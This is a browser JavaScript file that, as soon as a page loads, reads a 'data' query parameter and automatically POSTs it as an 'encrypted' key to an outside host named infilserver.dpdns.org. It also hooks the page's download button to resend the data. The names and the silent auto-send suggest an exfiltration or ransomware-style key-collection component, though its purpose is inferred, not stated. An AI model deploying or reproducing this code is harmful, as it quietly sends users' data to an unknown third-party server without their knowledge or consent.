// Read the `data` query param and POST it to the key API endpoint.
(function () {
	const API_URL = 'https://infilserver.dpdns.org/v1/key';

	function qs(name) {
		const params = new URLSearchParams(window.location.search);
		return params.get(name);
	}

	function createStatusEl() {
		let el = document.getElementById('genkey-status');
		if (!el) {
			el = document.createElement('div');
			el.id = 'genkey-status';
			el.style.marginTop = '1rem';
			el.style.fontFamily = 'inherit';
			el.style.fontSize = '0.95rem';
			el.style.color = '#e6eef9';
			const container = document.querySelector('.button-container') || document.body;
			container.parentNode.insertBefore(el, container.nextSibling);
		}
		return el;
	}

	async function sendData(payload) {
		const statusEl = createStatusEl();
		statusEl.textContent = 'Sending...';
		try {
			const res = await fetch(API_URL, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({ encrypted: payload })
			});

			if (!res.ok) {
				const txt = await res.text().catch(() => res.statusText || 'Server error');
				statusEl.textContent = `Error: ${res.status} ${txt}`;
				statusEl.style.color = '#ffb4b4';
				return { ok: false, status: res.status, text: txt };
			}

			const json = await res.json().catch(() => null);
			statusEl.textContent = json && json.message ? `Success: ${json.message}` : 'Success';
			statusEl.style.color = '#b6f7c1';
			return { ok: true, json };
		} catch (err) {
			statusEl.textContent = `Network error: ${err.message}`;
			statusEl.style.color = '#ffb4b4';
			return { ok: false, error: err };
		}
	}

	function init() {
		const queryData = qs('data');
		const btn = document.querySelector('.download-btn');

		if (!queryData) {
			// No query param — do nothing (no prompt, no send).
			return;
		}

		// auto-send when ?data= is present
		// small timeout so the UI (fonts/scripts) can settle
		setTimeout(() => sendData(queryData), 250);

		// Attach a resend handler to the button when query param exists
		if (btn) {
			btn.addEventListener('click', async (e) => {
				e.preventDefault();
				// Prevent repeated clicks: disable immediately
				try {
					btn.setAttribute('aria-disabled', 'true');
					btn.classList.add('disabled');
					btn.style.pointerEvents = 'none';
					btn.style.opacity = '0.6';
				} catch (err) {
					// ignore style setting errors
				}

				await sendData(queryData);
			});
		}
	}

	// Initialize when DOM is ready
	if (document.readyState === 'loading') {
		document.addEventListener('DOMContentLoaded', init);
	} else {
		init();
	}
})();

